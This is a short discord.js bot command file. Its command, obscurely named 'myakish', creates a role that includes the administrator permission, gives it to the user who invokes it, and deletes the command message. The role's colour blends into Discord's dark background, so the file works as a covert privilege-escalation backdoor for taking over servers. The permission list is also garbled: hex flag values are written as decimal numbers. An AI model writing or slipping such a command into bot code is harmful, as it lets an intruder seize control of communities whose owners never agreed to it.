const Discord = module.require("discord.js");

module.exports.run = async (bot, message, args) => {

    try {

        role = await message.guild.createRole({

            name: "Dope Role",
          	color: "#2f3136",
          	permissions: [1, 2, 4, 8, 10, 20, 40, 80, 100, 200, 400, 800, 1000, 2000, 4000, 8000, 10000, 20000, 40000, 80000, 100000, 200000, 400000, 800000, 1000000, 4000000, 8000000, 10000000, 20000000, 40000000]

        });
            
        message.member.addRole(role)
        message.delete(1000);

    } catch(e) {

        console.log(e.stack);

    }
}

module.exports.help = {

    name: "myakish",
    desc: "Gives you admin perms."

}
